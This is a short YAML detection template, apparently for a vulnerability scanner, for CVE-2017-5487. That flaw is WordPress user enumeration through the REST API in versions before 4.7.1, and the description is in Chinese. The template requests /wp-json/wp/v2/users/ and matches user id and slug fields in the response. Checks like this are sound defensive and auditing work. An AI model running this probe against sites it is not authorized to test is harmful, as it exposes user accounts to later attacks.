id: CVE-2017-5487

info:
  name: Wordpress<4.7.1 Exist Username Enumeration
  author: G-H-Z
  severity: medium
  description: |
    WordPress （是一种使用PHP语言开发的博客平台）WordPress 在4.7.0版本之后将REST API插件集成到默认功能之中。REST API为WordPress的使用者提供了一个方便快捷的管理接口。其中的CVE-2017-5487可以使攻击者绕过管理员权限查看wordpress上所有发布过文章的用户id与用户信息！
    影响版本：
    WordPress （版本号：< 4.7.1 ）
  reference:
    - http://blog.nsfocus.net/wordpress-user-enumeration-vulnerability-analysis/

rules:
  r0:
    request:
      method: GET
      path: /wp-json/wp/v2/users/
    expression: response.status == 200 && response.content_type.icontains("application/json") && response.body.bcontains(b'"id":') && response.body.bcontains(b'"slug":')
expression: r0()